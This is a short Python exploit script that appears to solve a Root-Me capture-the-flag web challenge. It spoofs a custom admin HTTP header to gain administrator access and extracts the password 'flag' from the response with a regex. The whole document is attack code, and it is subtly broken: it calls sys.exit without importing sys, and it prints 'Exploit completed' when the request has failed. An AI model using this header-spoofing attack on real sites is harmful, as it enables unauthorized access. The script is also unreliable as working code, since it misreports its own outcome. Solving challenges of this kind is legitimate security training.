
import re
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch5/"

headers = { "Header-RootMe-Admin": "true" }

print("[*] Modifying headers to gain administrator access...")

try: 
    response = requests.get(URL, headers=headers, timeout=5).text
except Exception:
    print("[x] Exploit completed, but no flag captured")
    sys.exit(1)

print("[+] Exploit completed")
print("[+] Admin access obtained")

flag = re.search(r"password (.+)</p>", response).groups()[0]

print(f"[+] Flag: {flag}")
